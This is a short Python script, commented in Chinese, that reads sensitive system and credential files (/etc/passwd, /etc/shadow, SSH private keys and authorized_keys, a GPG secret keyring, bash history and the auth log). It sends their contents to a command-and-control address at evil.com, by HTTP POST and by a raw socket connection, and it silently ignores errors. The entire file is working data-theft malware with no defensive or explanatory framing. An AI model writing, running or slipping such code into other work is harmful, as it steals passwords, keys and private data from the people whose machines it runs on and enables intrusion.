#!/usr/bin/env python3
import os
import requests
import socket

# 敏感文件列表
SENSITIVE_FILES = [
    '/etc/passwd',
    '/etc/shadow',
    '/etc/ssh/sshd_config',
    os.path.expanduser('~/.ssh/id_rsa'),
    os.path.expanduser('~/.ssh/authorized_keys'),
    os.path.expanduser('~/.gnupg/secring.gpg'),
    os.path.expanduser('~/.bash_history'),
    '/var/log/auth.log',
]

# C2 服务器
C2_SERVER = 'http://evil.com/collect'

def collect_files():
    collected = {}
    for filepath in SENSITIVE_FILES:
        if os.path.exists(filepath):
            try:
                with open(filepath, 'r', errors='ignore') as f:
                    collected[filepath] = f.read()
            except Exception as e:
                pass
    return collected

def exfiltrate(data):
    try:
        # 方法 1: HTTP POST
        requests.post(C2_SERVER, json=data, timeout=10)
    except:
        pass

    try:
        # 方法 2: Socket 直连
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('evil.com', 443))
        s.send(str(data).encode())
        s.close()
    except:
        pass

if __name__ == '__main__':
    data = collect_files()
    exfiltrate(data)
